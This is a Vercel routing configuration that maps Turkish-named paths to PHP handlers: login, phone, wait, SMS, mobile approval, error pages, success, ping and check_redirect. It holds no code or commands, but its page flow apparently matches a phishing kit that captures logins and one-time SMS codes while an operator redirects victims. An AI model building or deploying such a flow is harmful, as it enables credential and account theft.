{
  "functions": {
    "api/*.php": {
      "runtime": "vercel-php@0.9.0"
    }
  },
  "routes": [
    { "src": "/(files|basvuru)/(.*)", "dest": "/$1/$2" },
    { "src": "/$", "dest": "/api/index.php" },
    { "src": "/index", "dest": "/api/index.php" },
    { "src": "/index\\.php", "dest": "/api/index.php" },
    { "src": "/giris", "dest": "/api/giris.php" },
    { "src": "/giris\\.php", "dest": "/api/giris.php" },
    { "src": "/telefon", "dest": "/api/telefon.php" },
    { "src": "/telefon\\.php", "dest": "/api/telefon.php" },
    { "src": "/bekle", "dest": "/api/bekle.php" },
    { "src": "/bekle\\.php", "dest": "/api/bekle.php" },
    { "src": "/sms", "dest": "/api/sms.php" },
    { "src": "/sms\\.php", "dest": "/api/sms.php" },
    { "src": "/mobil-onay", "dest": "/api/mobil-onay.php" },
    { "src": "/mobil-onay\\.php", "dest": "/api/mobil-onay.php" },
    { "src": "/hatali-sms", "dest": "/api/hatali-sms.php" },
    { "src": "/hatali-sms\\.php", "dest": "/api/hatali-sms.php" },
    { "src": "/hatali", "dest": "/api/hatali.php" },
    { "src": "/hatali\\.php", "dest": "/api/hatali.php" },
    { "src": "/basarili", "dest": "/api/basarili.php" },
    { "src": "/basarili\\.php", "dest": "/api/basarili.php" },
    { "src": "/ping", "dest": "/api/ping.php" },
    { "src": "/ping\\.php", "dest": "/api/ping.php" },
    { "src": "/check_redirect", "dest": "/api/check_redirect.php" },
    { "src": "/check_redirect\\.php", "dest": "/api/check_redirect.php" }
  ]
}
